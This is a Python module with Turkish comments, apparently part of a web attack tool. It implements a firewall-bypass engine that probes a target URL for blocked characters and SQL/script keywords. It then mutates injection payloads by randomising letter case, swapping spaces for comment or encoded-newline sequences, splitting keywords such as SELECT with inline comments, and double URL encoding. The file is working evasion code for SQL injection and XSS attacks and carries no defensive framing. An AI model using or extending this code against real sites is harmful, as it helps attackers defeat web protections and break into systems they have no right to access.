# -*- coding: utf-8 -*-
"""adaptif waf mutasyon ve bypass motoru - payload çeşitlendirme ve karakter fuzzing"""

import random
import urllib.parse


class WafMutator:
    """waf bypass için payload mutasyon motoru"""

    def __init__(self, istek_yonetici=None):
        self.istek_yonetici = istek_yonetici
        self.engellenen_karakterler = set()
        self.izin_verilen_karakterler = set()

    def karakter_fuzzing(self, hedef_url):
        """
        hedef sunucuda temel özel karakterleri test ederek engellenen karakter haritasını çıkarır
        """
        if not self.istek_yonetici or not hedef_url:
            return

        test_karakterleri = ["'", '"', "<", ">", "/", ";", "--", "/*", "union", "select", "script"]
        for kr in test_karakterleri:
            test_url = f"{hedef_url}{'?' if '?' not in hedef_url else '&'}waf_test={urllib.parse.quote(kr)}"
            yanit = self.istek_yonetici.get(test_url)
            if yanit is not None and yanit.status_code in (403, 406, 501):
                self.engellenen_karakterler.add(kr)
            else:
                self.izin_verilen_karakterler.add(kr)

    def harf_büyüklüğü_değiştir(self, metin):
        """metindeki harflerin büyük/küçük durumunu rastgele değiştirir (rAsTgElE)"""
        return "".join(c.upper() if random.choice([True, False]) else c.lower() for c in metin)

    def bosluk_mutasyonu(self, payload):
        """boşluk karakterlerini WAF bypass alternatifleri ile değiştirir"""
        alternatifler = ["/**/", "%0a", "%0d%0a", "+", "/*!50000*/"]
        secilen = random.choice(alternatifler)
        return payload.replace(" ", secilen)

    def yorum_satiri_enjeksiyonu(self, payload):
        """anahtar kelimelerin arasına yorum satırları ekler (S/*test*/ELECT)"""
        kelimeler = ["SELECT", "UNION", "WHERE", "SCRIPT", "ALERT", "EVAL"]
        sonuc = payload
        for kelime in kelimeler:
            if kelime.lower() in sonuc.lower():
                orta = len(kelime) // 2
                yeni_kelime = kelime[:orta] + "/**/" + kelime[orta:]
                sonuc = sonuc.replace(kelime, yeni_kelime).replace(kelime.lower(), yeni_kelime.lower())
        return sonuc

    def cift_url_encode(self, payload):
        """payload'ı çift URL encode eder (%253Cscript%253E)"""
        tek = urllib.parse.quote(payload)
        return urllib.parse.quote(tek)

    def mutasyon_uret(self, payload):
        """
        payload için varyasyonlar türetir

        dönüş:
            mutasyona uğramış payload listesi
        """
        varyasyonlar = [payload]

        # 1. Harf büyüklüğü mutasyonu
        varyasyonlar.append(self.harf_büyüklüğü_değiştir(payload))

        # 2. Boşluk mutasyonu
        if " " in payload:
            varyasyonlar.append(self.bosluk_mutasyonu(payload))

        # 3. Yorum satırı ekleme
        varyasyonlar.append(self.yorum_satiri_enjeksiyonu(payload))

        # 4. Çift URL Encode
        varyasyonlar.append(self.cift_url_encode(payload))

        return list(set(varyasyonlar))
